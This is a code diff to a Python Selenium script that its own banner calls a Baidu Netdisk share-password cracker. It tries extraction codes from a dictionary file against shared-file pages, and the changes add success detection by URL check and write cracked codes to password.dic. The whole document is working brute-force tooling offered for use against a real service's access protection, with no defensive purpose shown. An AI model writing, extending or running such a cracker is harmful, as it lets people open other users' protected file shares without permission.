@@ -35,7 +35,7 @@ print("==============================================================")
 print("百度网盘分享文件密码破解器 by MXWXZ   最后测试于2018年5月9日)")
 # url=input("请输入URL地址（https://pan.baidu.com/share/init?xxx）：")
 
-url=url.replace("https://pan.baidu.com/share/init?","")
+# url=url.replace("https://pan.baidu.com/share/init?","")
 # pwdfile=input("请输入当前目录下破解字典文件名（留空默认allpwd.dic）：")
 
 if pwdfile == "":
@@ -72,7 +72,7 @@ def GetPwd():
         return ret
 options = webdriver.ChromeOptions()
 # 无头浏览器，不弹出图形界面，注释后会弹出图形界面
-options.add_argument('--headless')
+# options.add_argument('--headless')
 
 options.add_argument('--no-sandbox')
 # selenium会输出大量日志，这里将其金庸
@@ -164,14 +164,16 @@ def fuck():
             time.sleep(random.randint(2,3))
             tmp = WebDriverWait(driver, 60).until(
             EC.presence_of_element_located((By.ID, element_id)))
+            tmp1 =  WebDriverWait(driver, 60).until(
+            EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div[1]/div[2]/div[1]")))
         except  Exception:
             driver.quit()
             continue
 
         # tmp=driver.find_element_by_id("zkGv3a")
         # time.sleep(10)
-        text = tmp.get_attribute("innerText")
-        print( time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) ,": %s"%trying,tmp.get_attribute("innerText"))
+        text = tmp1.get_attribute("innerText")
+        print( time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) ,": %s"%trying,text)
         # fp = open("log2.dic", "a")
         # if fp.tell()!=0:
         #     fp.write("\n")
@@ -179,7 +181,7 @@ def fuck():
         # fp.close()
         
         driver.quit()
-        if "提取码错误"== text: 
+        if "提取码错误"== text or not driver.current_url.startswith(start_head): 
             if filelock.acquire(True):
                 fp = open("log2.dic", "a")
                 if fp.tell()!=0:
@@ -187,6 +189,13 @@ def fuck():
                 fp.write(trying)
                 fp.close()
                 filelock.release()
+        elif driver.current_url.startswith(start_head):
+            fp = open("password.dic", "a")
+            if fp.tell()!=0:
+                fp.write("\n")
+            fp.write(trying)
+            fp.close()
+            print(trying)
         else:
             if maybelock.acquire(True):
                 fp = open("maybe.dic", "a")
